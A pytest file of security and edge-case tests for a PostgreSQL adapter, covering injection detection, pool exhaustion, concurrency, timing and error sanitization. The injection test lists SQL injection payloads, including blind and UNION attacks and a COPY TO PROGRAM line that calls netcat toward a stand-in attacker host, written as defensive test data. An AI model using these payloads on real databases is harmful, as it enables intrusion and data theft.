"""
Enhanced security and edge case tests for PostgreSQL Adapter.

Tests advanced SQL injection techniques, timing attacks, connection pool exhaustion,
concurrent access patterns, and configuration validation edge cases.
"""

import asyncio
import time
import uuid
from unittest.mock import AsyncMock, Mock, patch

import pytest
from omnibase_core.core.onex_container import ModelONEXContainer
from omnibase_core.core_error_codes import CoreErrorCode
from omnibase_core.onex_error import OnexError

from omnibase_infra.models.postgres.model_postgres_query_request import (
    ModelPostgresQueryRequest,
)
from omnibase_infra.nodes.node_postgres_adapter_effect.v1_0_0.models.model_postgres_adapter_config import (
    ModelPostgresAdapterConfig,
)
from omnibase_infra.nodes.node_postgres_adapter_effect.v1_0_0.models.model_postgres_adapter_input import (
    ModelPostgresAdapterInput,
)
from omnibase_infra.nodes.node_postgres_adapter_effect.v1_0_0.node import (
    NodePostgresAdapterEffect,
)


class TestPostgresAdapterSecurityEdgeCases:
    """Advanced security and edge case tests for PostgreSQL adapter."""

    @pytest.fixture
    def container(self):
        """Create a basic ModelONEXContainer for testing."""
        return ModelONEXContainer()

    @pytest.fixture
    def mock_connection_manager(self):
        """Create a mock connection manager with advanced scenarios."""
        manager = AsyncMock()

        # Mock successful query execution
        manager.execute_query.return_value = [{"id": 1, "name": "test_service"}]

        # Mock health check
        manager.health_check.return_value = {
            "status": "healthy",
            "timestamp": time.time(),
            "connection_pool": {
                "active": 5,
                "idle": 15,
                "total": 20,
            },
            "database_info": {
                "version": "PostgreSQL 15.4",
            },
            "errors": [],
        }

        return manager

    @pytest.fixture
    def secure_config(self):
        """Create a secure production configuration."""
        return ModelPostgresAdapterConfig(
            max_query_size=25000,  # More restrictive for production
            max_parameter_count=50,
            max_parameter_size=5000,
            max_timeout_seconds=180,
            max_complexity_score=15,
            enable_query_complexity_validation=True,
            enable_sql_injection_detection=True,
            enable_error_sanitization=True,
            environment="production",
        )

    @pytest.fixture
    def adapter_with_secure_config(self, container, mock_connection_manager, secure_config):
        """Create adapter with secure production configuration."""
        mock_container = Mock(spec=ModelONEXContainer)
        mock_container.get_service.return_value = mock_connection_manager

        with patch("omnibase_infra.infrastructure.postgres_connection_manager.PostgresConnectionManager") as mock_manager_class:
            mock_manager_class.return_value = mock_connection_manager

            adapter = NodePostgresAdapterEffect(mock_container)
            adapter.config = secure_config
            adapter._connection_manager = mock_connection_manager

            return adapter

    @pytest.mark.asyncio
    async def test_uuid_correlation_id_validation(self, adapter_with_secure_config):
        """Test comprehensive UUID correlation ID validation."""

        # Test valid UUID
        valid_uuid = uuid.uuid4()
        validated = adapter_with_secure_config._validate_correlation_id(valid_uuid)
        assert validated == valid_uuid

        # Test valid UUID string
        uuid_string = str(uuid.uuid4())
        validated = adapter_with_secure_config._validate_correlation_id(uuid_string)
        assert str(validated) == uuid_string

        # Test None generates new UUID
        validated = adapter_with_secure_config._validate_correlation_id(None)
        assert isinstance(validated, uuid.UUID)

        # Test invalid UUID string
        with pytest.raises(OnexError) as exc_info:
            adapter_with_secure_config._validate_correlation_id("not-a-uuid")
        assert exc_info.value.code == CoreErrorCode.VALIDATION_ERROR

        # Test empty UUID
        empty_uuid = uuid.UUID("00000000-0000-0000-0000-000000000000")
        with pytest.raises(OnexError) as exc_info:
            adapter_with_secure_config._validate_correlation_id(empty_uuid)
        assert exc_info.value.code == CoreErrorCode.VALIDATION_ERROR

        # Test invalid type
        with pytest.raises(OnexError) as exc_info:
            adapter_with_secure_config._validate_correlation_id(123)
        assert exc_info.value.code == CoreErrorCode.VALIDATION_ERROR

    @pytest.mark.asyncio
    async def test_advanced_sql_injection_patterns(self, adapter_with_secure_config):
        """Test advanced SQL injection attack patterns."""

        advanced_injection_patterns = [
            # Time-based blind SQL injection
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END; --",

            # Boolean-based blind injection
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 AND '1'='1",

            # Union-based information extraction
            "' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema='public'--",

            # Function-based attacks
            "'; SELECT current_user, version(), database(); --",

            # Nested query attacks
            "'; SELECT * FROM users WHERE id IN (SELECT admin_id FROM admin_users); --",

            # Comment-based attacks
            "admin'/**/OR/**/1=1/**/--",

            # Encoded attacks
            "%27%20OR%201=1--",

            # PostgreSQL-specific attacks
            "'; COPY users TO PROGRAM 'nc attacker.com 4444'; --",

            # Buffer overflow attempts
            "'" + "A" * 10000 + "'",

            # XML/JSON injection
            "'; SELECT xmlparse(content '<?xml version=\"1.0\"?><root>test</root>'); --",
        ]

        correlation_id = uuid.uuid4()

        for injection_pattern in advanced_injection_patterns:
            query_request = ModelPostgresQueryRequest(
                query=injection_pattern,
                parameters=[],
                correlation_id=correlation_id,
            )

            input_envelope = ModelPostgresAdapterInput(
                operation_type="query",
                query_request=query_request,
                correlation_id=correlation_id,
            )

            # Process should detect and handle malicious patterns
            result = await adapter_with_secure_config.process(input_envelope)

            # Verify security measures are in place
            assert isinstance(result.correlation_id, uuid.UUID)

            # For production config, should block dangerous patterns
            if adapter_with_secure_config.config.enable_sql_injection_detection:
                # Most patterns should be detected, but let's ensure no system crashes
                assert result is not None

    @pytest.mark.asyncio
    async def test_connection_pool_exhaustion(self, adapter_with_secure_config):
        """Test behavior under connection pool exhaustion scenarios."""

        # Mock connection pool exhaustion
        adapter_with_secure_config._connection_manager.execute_query.side_effect = [
            Exception("FATAL: too many connections for role"),
            Exception("connection pool exhausted"),
            Exception("could not connect to server: Connection refused"),
        ]

        correlation_id = uuid.uuid4()
        query_request = ModelPostgresQueryRequest(
            query="SELECT 1",
            parameters=[],
            correlation_id=correlation_id,
        )

        input_envelope = ModelPostgresAdapterInput(
            operation_type="query",
            query_request=query_request,
            correlation_id=correlation_id,
        )

        # Should handle connection exhaustion gracefully
        result = await adapter_with_secure_config.process(input_envelope)

        assert result.success is False
        assert result.error_message is not None
        # Error should be sanitized to not reveal internal details
        assert "too many connections" not in result.error_message.lower()

    @pytest.mark.asyncio
    async def test_concurrent_access_thread_safety(self, adapter_with_secure_config):
        """Test thread safety under concurrent access patterns."""

        # Create multiple concurrent requests
        correlation_ids = [uuid.uuid4() for _ in range(20)]

        async def make_request(correlation_id):
            query_request = ModelPostgresQueryRequest(
                query="SELECT * FROM test_table WHERE id = $1",
                parameters=[1],
                correlation_id=correlation_id,
            )

            input_envelope = ModelPostgresAdapterInput(
                operation_type="query",
                query_request=query_request,
                correlation_id=correlation_id,
            )

            return await adapter_with_secure_config.process(input_envelope)

        # Execute requests concurrently
        tasks = [make_request(cid) for cid in correlation_ids]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Verify all requests completed without race conditions
        assert len(results) == 20

        for i, result in enumerate(results):
            if isinstance(result, Exception):
                pytest.fail(f"Request {i} failed with exception: {result}")
            else:
                assert result.correlation_id == correlation_ids[i]

    @pytest.mark.asyncio
    async def test_timing_attack_resistance(self, adapter_with_secure_config):
        """Test resistance to timing-based attacks."""

        # Mock different execution times for different query patterns
        execution_times = []

        async def mock_execute_with_timing(query, *args, **kwargs):
            # Simulate consistent timing regardless of query complexity
            await asyncio.sleep(0.01)  # Consistent 10ms delay
            return [{"result": "success"}]

        adapter_with_secure_config._connection_manager.execute_query.side_effect = mock_execute_with_timing

        queries = [
            "SELECT * FROM users WHERE username = 'admin'",
            "SELECT * FROM users WHERE username = 'nonexistent'",
            "SELECT * FROM users WHERE username = 'test'",
        ]

        correlation_id = uuid.uuid4()

        for query in queries:
            query_request = ModelPostgresQueryRequest(
                query=query,
                parameters=[],
                correlation_id=correlation_id,
            )

            input_envelope = ModelPostgresAdapterInput(
                operation_type="query",
                query_request=query_request,
                correlation_id=correlation_id,
            )

            start_time = time.perf_counter()
            result = await adapter_with_secure_config.process(input_envelope)
            end_time = time.perf_counter()

            execution_times.append(end_time - start_time)

        # Verify timing consistency (all should be within 50% of each other)
        min_time = min(execution_times)
        max_time = max(execution_times)

        # Allow for reasonable variance but prevent obvious timing attacks
        assert max_time - min_time < 0.005  # Less than 5ms variance

    @pytest.mark.asyncio
    async def test_configuration_security_validation(self):
        """Test production configuration security validation."""

        # Test production configuration requires security features
        with pytest.raises(OnexError) as exc_info:
            config = ModelPostgresAdapterConfig(
                environment="production",
                enable_error_sanitization=False,  # Should fail in production
            )
            config.validate_security_config()

        assert exc_info.value.code == CoreErrorCode.CONFIGURATION_ERROR
        assert "production environment" in str(exc_info.value)

        # Test SQL injection detection requirement
        with pytest.raises(OnexError) as exc_info:
            config = ModelPostgresAdapterConfig(
                environment="production",
                enable_sql_injection_detection=False,  # Should fail in production
            )
            config.validate_security_config()

        assert exc_info.value.code == CoreErrorCode.CONFIGURATION_ERROR

    @pytest.mark.asyncio
    async def test_large_query_memory_management(self, adapter_with_secure_config):
        """Test memory management with large queries and results."""

        # Test large query size validation
        large_query = "SELECT * FROM huge_table WHERE " + " OR ".join([f"id = {i}" for i in range(10000)])

        correlation_id = uuid.uuid4()
        query_request = ModelPostgresQueryRequest(
            query=large_query,
            parameters=[],
            correlation_id=correlation_id,
        )

        input_envelope = ModelPostgresAdapterInput(
            operation_type="query",
            query_request=query_request,
            correlation_id=correlation_id,
        )

        # Should be blocked by query size limits
        result = await adapter_with_secure_config.process(input_envelope)

        # Verify size limits are enforced
        if len(large_query) > adapter_with_secure_config.config.max_query_size:
            assert result.success is False
            assert "query size" in result.error_message.lower()

    def test_secure_environment_variable_loading(self):
        """Test secure configuration loading without exposing sensitive data."""

        # Test secure mode prevents logging of configuration values
        with patch.dict("os.environ", {
            "POSTGRES_ADAPTER_MAX_QUERY_SIZE": "30000",
            "POSTGRES_ADAPTER_ENVIRONMENT": "production",
        }):
            config = ModelPostgresAdapterConfig.from_environment(secure_mode=True)
            assert config.max_query_size == 30000
            assert config.environment == "production"

        # Test configuration validation errors don't expose internal details
        with patch.dict("os.environ", {
            "POSTGRES_ADAPTER_MAX_QUERY_SIZE": "invalid_number",
        }):
            try:
                config = ModelPostgresAdapterConfig.from_environment(secure_mode=True)
            except OnexError as e:
                assert "Failed to load PostgreSQL adapter configuration" in str(e)

    @pytest.mark.asyncio
    async def test_error_message_information_disclosure_prevention(self, adapter_with_secure_config):
        """Test prevention of information disclosure through error messages."""

        # Mock database errors that might contain sensitive information
        sensitive_errors = [
            'relation "secret_admin_table" does not exist',
            'column "hidden_password_field" does not exist',
            "permission denied for table sensitive_data",
            'authentication failed for user "admin" with password "secret123"',
            "connection failed: postgresql://user:password123@internal-db:5432/prod_db",
        ]

        correlation_id = uuid.uuid4()

        for sensitive_error in sensitive_errors:
            adapter_with_secure_config._connection_manager.execute_query.side_effect = Exception(sensitive_error)

            query_request = ModelPostgresQueryRequest(
                query="SELECT 1",
                parameters=[],
                correlation_id=correlation_id,
            )

            input_envelope = ModelPostgresAdapterInput(
                operation_type="query",
                query_request=query_request,
                correlation_id=correlation_id,
            )

            result = await adapter_with_secure_config.process(input_envelope)

            # Verify sensitive information is sanitized
            error_message = result.error_message.lower()
            assert "secret" not in error_message
            assert "admin" not in error_message
            assert "password123" not in error_message
            assert "internal-db" not in error_message

            # Should still provide useful error information
            assert len(result.error_message) > 0
            assert result.error_message != sensitive_error


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
